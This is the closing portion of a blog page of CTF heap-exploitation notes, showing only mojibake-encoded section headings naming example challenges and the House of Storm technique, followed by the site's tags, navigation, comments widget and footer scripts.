<h3 id="ä¾‹é¢˜ï¼šLCTF2016-PWN200"><a href="#ä¾‹é¢˜ï¼šLCTF2016-PWN200" class="headerlink" title="ä¾‹é¢˜ï¼šLCTF2016_PWN200"></a>ä¾‹é¢˜ï¼šLCTF2016_PWN200</h3><h2 id="House-of-Storm-é£æš´ã®åŸŸ"><a href="#House-of-Storm-é£æš´ã®åŸŸ" class="headerlink" title="House of Storm - é£æš´ã®åŸŸ"></a>House of Storm - é£æš´ã®åŸŸ</h2><p>large bin attack + unsorted bin attack</p>
<h3 id="ä¾‹é¢˜ï¼š0ctf2018-heapstorm2"><a href="#ä¾‹é¢˜ï¼š0ctf2018-heapstorm2" class="headerlink" title="ä¾‹é¢˜ï¼š0ctf2018_ heapstorm2"></a>ä¾‹é¢˜ï¼š0ctf2018_ heapstorm2</h3>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/python/">#python</a>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">#ä¿¡æ¯å®‰å…¨</a>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/%E5%A0%86/">#å †</a>
      
        <a href="/tags/CTF/">#CTF</a>
      
        <a href="/tags/Use-After-Free/">#Use After Free</a>
      
        <a href="/tags/ret2libc/">#ret2libc</a>
      
        <a href="/tags/ROP/">#ROP</a>
      
        <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/">#å †é£æ°´</a>
      
        <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/">#gotè¡¨åŠ«æŒ</a>
      
        <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">#æ ˆè¿ç§»</a>
      
        <a href="/tags/IO-FILE-hijack/">#_IO_FILE hijack</a>
      
        <a href="/tags/Fastbin-Attack/">#Fastbin Attack</a>
      
        <a href="/tags/FSOP/">#FSOP</a>
      
        <a href="/tags/Heap-Overflow/">#Heap Overflow</a>
      
        <a href="/tags/House-of-Force/">#House of Force</a>
      
        <a href="/tags/House-of-Orange/">#House of Orange</a>
      
        <a href="/tags/House-of-Spirit/">#House of Spirit</a>
      
        <a href="/tags/off-by-one/">#off by one</a>
      
        <a href="/tags/one-gadget/">#one_gadget</a>
      
        <a href="/tags/Unlink/">#Unlink</a>
      
        <a href="/tags/Unsorted-bin-Attack/">#Unsorted bin Attack</a>
      
        <a href="/tags/House-of-Botcake/">#House of Botcake</a>
      
        <a href="/tags/House-of-Einherjar/">#House of Einherjar</a>
      
        <a href="/tags/House-of-Husk/">#House of Husk</a>
      
        <a href="/tags/House-of-Kiwi/">#House of Kiwi</a>
      
        <a href="/tags/House-of-Lore/">#House of Lore</a>
      
        <a href="/tags/House-of-Rabbit/">#House of Rabbit</a>
      
        <a href="/tags/House-of-Roman/">#House of Roman</a>
      
        <a href="/tags/House-of-Storm/">#House of Storm</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ã€PWN.0x01ã€‘ç®€æ˜“ Glibc heap exploit ç¬”è®°</div>
      <div>https://arttnba3.github.io/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2021å¹´5æœˆ10æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/05/15/CTF-0X04-CISCN2021-PRELIMINARY/" title="ã€CTF.0x04ã€‘CISCN2021åˆèµ› - Pwn WP">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ã€CTF.0x04ã€‘CISCN2021åˆèµ› - Pwn WP</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/04/24/CVE-0X01-CVE-2021-3156/" title="ã€CVE.0x01ã€‘CVE-2021-3156 sudo å †æº¢å‡ºæ¼æ´å¤ç°åŠç®€è¦åˆ†æ">
                        <span class="hidden-mobile">ã€CVE.0x01ã€‘CVE-2021-3156 sudo å †æº¢å‡ºæ¼æ´å¤ç°åŠç®€è¦åˆ†æ</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆå‘—ï¼ˆç¬‘ï¼‰","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® -->
  <span id="timeDate">è½½å…¥å¤©æ•°...</span>
  <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3çš„å°å±‹å·²ç»å®‰å…¨å­˜åœ¨äº† "+dnum+" å¤© ";
          document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
